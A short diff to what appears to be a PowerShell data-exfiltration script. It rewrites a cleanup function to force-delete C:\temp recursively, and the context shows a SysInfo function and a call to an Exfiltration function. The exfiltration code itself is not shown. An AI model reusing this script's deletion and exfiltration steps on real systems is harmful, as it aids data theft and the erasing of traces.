@@ -114,10 +114,15 @@ function SysInfo {
 
 # Function to delete the temporary directory
 function DelTempDir {
-    cd C:\
-    rmdir -R \temp
+    Set-Location -Path "C:\"
+    
+    # Check if the C:\temp directory exists before attempting to remove it
+    if (Test-Path -Path "C:\temp" -PathType Container) {
+        Remove-Item -Path "C:\temp" -Force -Recurse
+    }
     #exit
 }
+
 
 # Call Exfiltration
 Exfiltration
